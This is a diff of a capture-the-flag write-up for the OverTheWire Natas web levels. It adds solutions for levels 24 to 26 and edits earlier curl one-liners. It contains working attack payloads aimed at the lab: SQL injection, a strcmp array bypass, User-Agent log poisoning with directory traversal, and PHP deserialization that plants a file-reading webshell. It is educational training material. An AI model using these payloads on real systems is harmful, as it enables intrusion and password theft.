@@ -39,6 +39,8 @@ URL:      http://natas0.natas.labs.overthewire.org
 - [Level 21](#level-21)
 - [Level 22](#level-22)
 - [Level 23](#level-23)
+- [Level 24](#level-23)
+- [Level 25](#level-23)
 
 </details>
 
@@ -151,16 +153,14 @@ $secret = "FOEIUWGHFEEUHOFUOIU";
 ?>
 ```
 
-If we look at the form in sourcecode, we can see how to submit our secret. We need to send a `POST` request with the parameters `secret` and `submit`:
+If we look at the first two lines of the script, we can see how to submit our secret:
 
-```html
-<form method=post>
-Input secret: <input name=secret><br>
-<input type=submit name=submit>
-</form>
+```php
+    if(array_key_exists("submit", $_POST)) {
+        if($secret == $_POST['secret']) {
 ```
 
-With this information, we can now craft a `curl` command to get the password for us.
+We need to send a `POST` request with the parameters `secret` and `submit`. Now we can now craft a `curl` command to get the password for us.
 
 ```bash
 curl -s "http://natas6:$natas6_pass@natas6.natas.labs.overthewire.org/" -X 'POST' -d "secret=$(curl -s http://natas6:$natas6_pass@natas6.natas.labs.overthewire.org/includes/secret.inc | grep -oP '\$secret = "\K[^"]+')&submit" | sed "s/$natas6_pass//g" | egrep -o [[:alnum:]]{32}
@@ -414,7 +414,7 @@ Doesn't seem like anything special is going on here. All it's doing is generatin
 We can try uploading a simple `php` script to read the flag:
 
 ```php
-<?php readfile("test.txt");?>
+<?php readfile("test.txt")?>
 ```
 
 The only problem is it gets renamed to a `jpg` when we upload it through the form, which will prevent our script from being executed. However, since the renaming is done on the client side, we can just send our own request without modifying the extension.
@@ -422,16 +422,16 @@ The only problem is it gets renamed to a `jpg` when we upload it through the for
 First, we need to figure out how to upload the file:
 
 ```bash
-echo '<?php readfile("/etc/natas_webpass/natas13");?>' |\
-curl -s "http://natas12:$natas12_pass@natas12.natas.labs.overthewire.org/"\
- -X 'POST' -F "filename=natas12.php" -F "uploadedfile=@-;filename=natas12.php" |\
+echo '<?php readfile("/etc/natas_webpass/natas13")?>' | \
+curl -s "http://natas12:$natas12_pass@natas12.natas.labs.overthewire.org/" \
+-X 'POST' -F "filename=natas12.php" -F "uploadedfile=@-;filename=natas12.php" | \
 grep -oP 'href="\Kupload/[[:alnum:]]{10}.php'
 ```
 
 Then we get the results of the file we just uploaded:
 
 ```bash
-curl "http://natas12:$natas12_pass@natas12.natas.labs.overthewire.org/$(echo -n '<?php readfile("/etc/natas_webpass/natas13");?>' | curl -s "http://natas12:$natas12_pass@natas12.natas.labs.overthewire.org/" -X 'POST' -F "filename=natas12.php" -F "uploadedfile=@-;filename=natas12.php" | grep -oP 'href="\Kupload/[[:alnum:]]{10}.php')"
+curl "http://natas12:$natas12_pass@natas12.natas.labs.overthewire.org/$(echo -n '<?php readfile("/etc/natas_webpass/natas13")?>' | curl -s "http://natas12:$natas12_pass@natas12.natas.labs.overthewire.org/" -X 'POST' -F "filename=natas12.php" -F "uploadedfile=@-;filename=natas12.php" | grep -oP 'href="\Kupload/[[:alnum:]]{10}.php')"
 ```
 
 ## Level 13
@@ -498,6 +498,7 @@ Choose a JPEG to upload (max 1KB):<br/>
 <input name="uploadedfile" type="file" /><br />
 <input type="submit" value="Upload File" />
 </form>
+<? } ?>
 ```
 
 This level is essentially the same as the last level except for one line:
@@ -545,6 +546,7 @@ Username: <input name="username"><br>
 Password: <input name="password"><br>
 <input type="submit" value="Login" />
 </form>
+<? } ?>
 ```
 
 This level is a basic SQL injection. All we need to do is insert a statement that completes this query:
@@ -562,7 +564,7 @@ SELECT * from users where username="" or 1=1
 Now to send our SQLi:
 
 ```bash
-curl -s "http://natas14:$natas14_pass@natas14.natas.labs.overthewire.org/" -X 'POST' -d 'username=" or 1=1£&password=' | sed "s/$natas14_pass//g" | egrep -o [[:alnum:]]{32}
+curl -s "http://natas14:$natas14_pass@natas14.natas.labs.overthewire.org/index.php" --data-urlencode 'username=" or 1=1#' | sed "s/$natas14_pass//g" | egrep -o [[:alnum:]]{32}
 ```
 
 ## Level 15
@@ -609,6 +611,7 @@ if(array_key_exists("username", $_REQUEST)) {
 Username: <input name="username"><br>
 <input type="submit" value="Check existence" />
 </form>
+<? } ?>
 ```
 
 This is another SQLi challenge except this time, it doesn't return any results. Instead, it only tells us whether a user exists or not. This is called a `blind SQL injection`. To perform a blind SQLi, we will conduct a series of *true* or *false* queries. If the site responds with `This user exists.`, we know that our input was correct. This allows us to brute force the password one character at a time.
@@ -662,13 +665,6 @@ if __name__ == '__main__':
 [Sourcecode](http://natas16.natas.labs.overthewire.org/index-source.html):
 
 ```php
-<form>
-Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
-</form>
-
-
-Output:
-<pre>
 <?
 $key = "";
 
@@ -684,7 +680,6 @@ if($key != "") {
     }
 }
 ?>
-</pre>
 ```
 
 Looks like we have another `grep` challenge. This time, there are a ton of extra characters that aren't allowed in our query. Our input is also wrapped with double quotes to prevent us from grepping multiple files like we did before. This is actually a blessing in disguise because in Linux, the shell will still interpret special characters on strings wrapped with double quotes.
@@ -710,7 +705,7 @@ We can reuse the code from the last challenge to get [this (with asyncio)](files
 import requests
 
 
-url = 'http://natas16.natas.labs.overthewire.org/index.php?needle={}password&submit'
+url = 'http://natas16.natas.labs.overthewire.org/index.php?needle={}password'
 auth = ('natas16', natas16_pass)
 
 def get_charset():
@@ -787,6 +782,7 @@ if(array_key_exists("username", $_REQUEST)) {
 Username: <input name="username"><br>
 <input type="submit" value="Check existence" />
 </form>
+<? } ?>
 ```
 
 Alright, so we have another SQL challenge, but this time, it looks like the `echo` lines are commented out. We no longer have an output to determine whether our query was `true` or `false`. However, this doesn't mean we're out of luck just yet.
@@ -1258,7 +1254,7 @@ Looks like we're in the clear. This should be an easy solve. All we have to do i
 We will need to send two requests to get the password. The first to set the session's variables with `mywrite`, then the second to load the page with our newly set session variables.
 
 ```bash
-curl -s "http://natas20:$natas20_pass@natas20.natas.labs.overthewire.org/" -b PHPSESSID=$(curl -I -s "http://natas20:$natas20_pass@natas20.natas.labs.overthewire.org/index.php?name=admin%0aadmin+1" | grep -oP 'PHPSESSID=\K[[:alnum:]-]+(?=;)') | sed "s/$natas20_pass//g" | egrep -o [[:alnum:]]{32}
+curl -s "http://natas20:$natas20_pass@natas20.natas.labs.overthewire.org/" -b PHPSESSID=$(curl -Is "http://natas20:$natas20_pass@natas20.natas.labs.overthewire.org/index.php?name=admin%0aadmin+1" | grep -oP 'PHPSESSID=\K[[:alnum:]-]+(?=;)') | sed "s/$natas20_pass//g" | egrep -o [[:alnum:]]{32}
 ```
 
 ## Level 21
@@ -1346,7 +1342,7 @@ if(array_key_exists("submit", $_REQUEST)) {
 We can see that if `submit` is a parameter, it will just set every key/value pair, regardless of the key. Easy enough. All we have to do is submit a request with `admin=1&submit`.
 
 ```bash
-curl -s "http://natas21:$natas21_pass@natas21.natas.labs.overthewire.org/" -b PHPSESSID=$(curl -I -s "http://natas21:$natas21_pass@natas21-experimenter.natas.labs.overthewire.org/index.php?admin=1&submit" | grep -oP 'PHPSESSID=\K[[:alnum:]-]+(?=;)') | sed "s/$natas21_pass//g" | egrep -o [[:alnum:]]{32}
+curl -s "http://natas21:$natas21_pass@natas21.natas.labs.overthewire.org/" -b PHPSESSID=$(curl -Is "http://natas21:$natas21_pass@natas21-experimenter.natas.labs.overthewire.org/index.php?admin=1&submit" | grep -oP 'PHPSESSID=\K[[:alnum:]-]+(?=;)') | sed "s/$natas21_pass//g" | egrep -o [[:alnum:]]{32}
 ```
 
 ## Level 22
@@ -1415,6 +1411,8 @@ Now, we just need to figure out how to get our input to be greater than 10. If w
 
 > If both operands are numeric strings, or one operand is a number and the other one is a numeric string, then the comparison is done numerically.
 
+And this:
+
 > | Type of Operand 1 | Type of Operand 2 | Result
 > |-|-|-|
 > |...|...|...|
@@ -1424,4 +1422,401 @@ That's... cool. Apparently when php compares a string to integer, it will conver
 
 ```bash
 curl -s "http://natas23:$natas23_pass@natas23.natas.labs.overthewire.org/index.php?passwd=11iloveyou" | sed "s/$natas23_pass//g" | egrep -o [[:alnum:]]{32}
+```
+
+## Level 24
+
+![natas24_index.jpg](screenshots/natas/natas24_index.jpg)
+
+[Sourcecode](http://natas24.natas.labs.overthewire.org/):
+
+```php
+<?php
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(!strcmp($_REQUEST["passwd"],"<censored>")){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas25 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+    // morla / 10111
+?>
+```
+
+For this challenge, we need to figure out how to get our input to pass this check:
+
+```php
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(!strcmp($_REQUEST["passwd"],"<censored>")){
+```
+
+[strcmp](https://www.php.net/manual/en/function.strcmp.php) returns 0 when the two inputs are equal to each other. Unfortunately, there is no way to brute force the password. However, if we read through the [comment section](https://www.php.net/manual/en/function.strcmp.php#108563), we see this:
+
+> If you rely on strcmp for safe string comparisons, both parameters must be strings, the result is otherwise extremely unpredictable.
+> ...
+> strcmp("foo", array()) => NULL + PHP Warning
+
+Interesting... Apparently, if we compare any string to an array with `strcmp`, it will throw a warning, but still `NULL`. For our purposes, a `NULL` return value is enough to get us past the validation. Luckily for us, since there is no type checking, we can just typecast our parameter as array by sending `passwd[]`.
+
+```bash
+curl -s "http://natas24:$natas24_pass@natas24.natas.labs.overthewire.org/index.php?passwd[]" | sed "s/$natas24_pass//g" | egrep -o [[:alnum:]]{32}
+```
+
+## Level 25
+
+![natas25_index.jpg](screenshots/natas/natas25_index.jpg)
+
+[Sourcecode](http://natas25.natas.labs.overthewire.org/index-source.html):
+
+```php
+<?php
+    // cheers and <3 to malvina
+    // - morla
+
+    function setLanguage(){
+        /* language setup */
+        if(array_key_exists("lang",$_REQUEST))
+            if(safeinclude("language/" . $_REQUEST["lang"] ))
+                return 1;
+        safeinclude("language/en");
+    }
+
+    function safeinclude($filename){
+        // check for directory traversal
+        if(strstr($filename,"../")){
+            logRequest("Directory traversal attempt! fixing request.");
+            $filename=str_replace("../","",$filename);
+        }
+        // dont let ppl steal our passwords
+        if(strstr($filename,"natas_webpass")){
+            logRequest("Illegal file access detected! Aborting!");
+            exit(-1);
+        }
+        // add more checks...
+
+        if (file_exists($filename)) {
+            include($filename);
+            return 1;
+        }
+        return 0;
+    }
+
+    function listFiles($path){
+        $listoffiles=array();
+        if ($handle = opendir($path))
+            while (false !== ($file = readdir($handle)))
+                if ($file != "." && $file != "..")
+                    $listoffiles[]=$file;
+
+        closedir($handle);
+        return $listoffiles;
+    }
+
+    function logRequest($message){
+        $log="[". date("d.m.Y H::i:s",time()) ."]";
+        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . " \"" . $message ."\"\n";
+        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+        fwrite($fd,$log);
+        fclose($fd);
+    }
+?>
+
+<h1>natas25</h1>
+<div id="content">
+<div align="right">
+<form>
+<select name='lang' onchange='this.form.submit()'>
+<option>language</option>
+<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
+</select>
+</form>
+</div>
+
+<?php
+    session_start();
+    setLanguage();
+
+    echo "<h2>$__GREETING</h2>";
+    echo "<p align=\"justify\">$__MSG";
+    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
+?>
+```
+
+Alright, once again, we start at our goal and work backwards. However, this time, it isn't so easy to identify where our goal is. Unlike the past challenges, there isn't anything here that prints the password for us. Let's try a different approach: looking for any parameters we have control over, and how they are handled.
+
+Every time the page is loaded, it runs this function:
+
+```php
+    function setLanguage(){
+        /* language setup */
+        if(array_key_exists("lang",$_REQUEST))
+            if(safeinclude("language/" . $_REQUEST["lang"] ))
+                return 1;
+        safeinclude("language/en");
+    }
+```
+
+It looks like this function will include any file we send in the `lang` parameter. Unfortunately, it's not that simple. It's using this function to include files:
+
+```php
+    function safeinclude($filename){
+        // check for directory traversal
+        if(strstr($filename,"../")){
+            logRequest("Directory traversal attempt! fixing request.");
+            $filename=str_replace("../","",$filename);
+        }
+        // dont let ppl steal our passwords
+        if(strstr($filename,"natas_webpass")){
+            logRequest("Illegal file access detected! Aborting!");
+            exit(-1);
+        }
+        // add more checks...
+
+        if (file_exists($filename)) {
+            include($filename);
+            return 1;
+        }
+        return 0;
+    }
+```
+
+Before it includes a file, it first checks if a directory traversal or `natas_webpass` is in our request. Looks like were out of luck here.
+
+Let's keep looking through the source code for more things we have control over:
+
+```php
+    function logRequest($message){
+        $log="[". date("d.m.Y H::i:s",time()) ."]";
+        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . " \"" . $message ."\"\n";
+        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
+        fwrite($fd,$log);
+        fclose($fd);
+    }
+```
+
+Interesting... If we look back at the `safeinclude` function, we see it logs directory traversal and `natas_webpass` attempts using the `logRequest` function. The `logRequest` then logs our `HTTP_USER_AGENT` string in a file named `natas25_<session_id>.log` in the `/var/www/natas/natas25/logs/` directory. Luckily for us, that filename does not have `natas_webpass` in it. What's even better is when a file is included with `include`, it will interpret any php code in the file. It looks like we can inject some code in our user agent string.
+
+However, we're not out of the woods yet. If we take another look at the `setLanguage` function, it prepends `language/` to any file we try to read. Based on the log file's save path, we can assume the web page's root directory is `/var/www/natas/natas25/`. We need to somehow do a directory traversal from `/var/www/natas/natas25/language` to `/var/www/natas/natas25/logs`. Let's take a closer look at how the directory traversal check works:
+
+```php
+        if(strstr($filename,"../")){
+            logRequest("Directory traversal attempt! fixing request.");
+            $filename=str_replace("../","",$filename);
+        }
+```
+
+If it sees the string `../` in our filename, it deletes all instances of `../`. Hang on a second... It only does this once, then continues with the rest of the function. Looks like we've found a vulnerability. Since it is only searching and replacing the string `../`, we can send something like `....//`, which only has one occurrence of `../`. However, when `../` is replaced, we are left with `../`.
+
+Looks like we've got all the pieces of the puzzle for our exploit. We have to:
+
+1. Set our user agent string to something to read the password with.
+2. Trigger a `logRequest` call.
+3. Read the log by doing a directory traversal.
+
+Since there doesn't seem to be any validation of the session id, we do all of this in one request by setting our own session id value.
+
+```bash
+PHPSESSID=$(cat /dev/urandom | tr -cd [:alnum:] | head -c16); curl -s "http://natas25:$natas25_pass@natas25.natas.labs.overthewire.org/index.php" -b "PHPSESSID=$PHPSESSID" --data-urlencode "lang=/....//logs/natas25_$PHPSESSID.log" -A '<?php readfile("/etc/natas_webpass/natas26")?>' | sed "s/$natas25_pass//g" | egrep -o [[:alnum:]]{32}
+```
+
+## Level 26
+
+![natas26_index.jpg](screenshots/natas/natas26_index.jpg)
+
+[Sourcecode](http://natas26.natas.labs.overthewire.org/):
+
+```php
+<?php
+    // sry, this is ugly as hell.
+    // cheers kaliman ;)
+    // - morla
+
+    class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+
+        function __construct($file){
+            // initialise variables
+            $this->initMsg="#--session started--#\n";
+            $this->exitMsg="#--session end--#\n";
+            $this->logFile = "/tmp/natas26_" . $file . ".log";
+
+            // write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$initMsg);
+            fclose($fd);
+        }
+
+        function log($msg){
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$msg."\n");
+            fclose($fd);
+        }
+
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->exitMsg);
+            fclose($fd);
+        }
+    }
+
+    function showImage($filename){
+        if(file_exists($filename))
+            echo "<img src=\"$filename\">";
+    }
+
+    function drawImage($filename){
+        $img=imagecreatetruecolor(400,300);
+        drawFromUserdata($img);
+        imagepng($img,$filename);
+        imagedestroy($img);
+    }
+
+    function drawFromUserdata($img){
+        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+
+            $color=imagecolorallocate($img,0xff,0x12,0x1c);
+            imageline($img,$_GET["x1"], $_GET["y1"],
+                            $_GET["x2"], $_GET["y2"], $color);
+        }
+
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+            if($drawing)
+                foreach($drawing as $object)
+                    if( array_key_exists("x1", $object) &&
+                        array_key_exists("y1", $object) &&
+                        array_key_exists("x2", $object) &&
+                        array_key_exists("y2", $object)){
+
+                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
+                        imageline($img,$object["x1"],$object["y1"],
+                                $object["x2"] ,$object["y2"] ,$color);
+
+                    }
+        }
+    }
+
+    function storeData(){
+        $new_object=array();
+
+        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
+            $new_object["x1"]=$_GET["x1"];
+            $new_object["y1"]=$_GET["y1"];
+            $new_object["x2"]=$_GET["x2"];
+            $new_object["y2"]=$_GET["y2"];
+        }
+
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+        }
+        else{
+            // create new array
+            $drawing=array();
+        }
+
+        $drawing[]=$new_object;
+        setcookie("drawing",base64_encode(serialize($drawing)));
+    }
+?>
+
+<h1>natas26</h1>
+<div id="content">
+
+Draw a line:<br>
+<form name="input" method="get">
+X1<input type="text" name="x1" size=2>
+Y1<input type="text" name="y1" size=2>
+X2<input type="text" name="x2" size=2>
+Y2<input type="text" name="y2" size=2>
+<input type="submit" value="DRAW!">
+</form>
+
+<?php
+    session_start();
+
+    if (array_key_exists("drawing", $_COOKIE) ||
+        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
+            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){
+        $imgfile="img/natas26_" . session_id() .".png";
+        drawImage($imgfile);
+        showImage($imgfile);
+        storeData();
+    }
+
+?>
+```
+
+Alright, so let's dig in. While quickly skimming the code, I don't really see anything interesting happening with the `x1`, `y1`, `x2`, or `y2` variables. It doesn't seem to be used in any way that can be exploited, so we can ignore that for now. I also notice the `Logger` class is defined, but never used in the code. Strange... I wonder why that is.
+
+Let's keep digging to see if there is anything else interesting. After looking through the source code, we notice this:
+
+```php
+        if (array_key_exists("drawing", $_COOKIE)){
+            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
+```
+
+Looks like we've found the vulnerability. If we look at the documentation for the [unserialize](https://www.php.net/manual/en/function.unserialize) function, we see a big fat warning message saying:
+
+> **Warning** Do not pass untrusted user input to unserialize() regardless of the options value of allowed_classes. Unserialization can result in code being loaded and executed due to object instantiation and autoloading, and a malicious user may be able to exploit this.
+
+That happens to be our exact scenario. We have complete control over what gets passed to the `unserialize` function through our cookie. Now we just have to figure out what to pass it. Hmm... Let's take another look at the mysterious `Logger` class from earlier:
+
+```php
+    class Logger{
+        private $logFile;
+        private $initMsg;
+        private $exitMsg;
+
+        function __construct($file){
+            // initialise variables
+            $this->initMsg="#--session started--#\n";
+            $this->exitMsg="#--session end--#\n";
+            $this->logFile = "/tmp/natas26_" . $file . ".log";
+
+            // write initial message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$initMsg);
+            fclose($fd);
+        }
+
+        function log($msg){
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$msg."\n");
+            fclose($fd);
+        }
+
+        function __destruct(){
+            // write exit message
+            $fd=fopen($this->logFile,"a+");
+            fwrite($fd,$this->exitMsg);
+            fclose($fd);
+        }
+    }
+```
+
+Interesting. It looks like a `Logger` object will write information to a file when it's created and deleted. Luckily for us, the `unserialize` function occurs within the `drawFromUserData` function. This means if we pass it a `Logger` object, it will be deleted when `drawFromUserData` is done running, which will then run the `__destruct` function, thus logging the `exitMsg` in `logFile`. Great, now we just have to create a serialized `Logger` object:
+
+```php
+<?php
+class Logger{
+    private $exitMsg="<?php readfile('/etc/natas_webpass/natas27')?>";
+    private $logFile="img/random_filename.php";
+}
+echo base64_encode(serialize(new Logger()));
+?>
+```
+
+Now we pass that to the site and read the file:
+
+```php
+filename=$(cat /dev/urandom | tr -cd [:alnum:] | head -c16); curl -s "http://natas26:$natas26_pass@natas26.natas.labs.overthewire.org/" -b drawing=$(php -r 'class Logger{private $exitMsg="<?php readfile('"'/etc/natas_webpass/natas27'"')?>";private $logFile="img/'$filename'.php";}echo urlencode(base64_encode(serialize(new Logger())));') -o /dev/null; curl -s "http://natas26:$natas26_pass@natas26.natas.labs.overthewire.org/img/$filename.php"
 ```
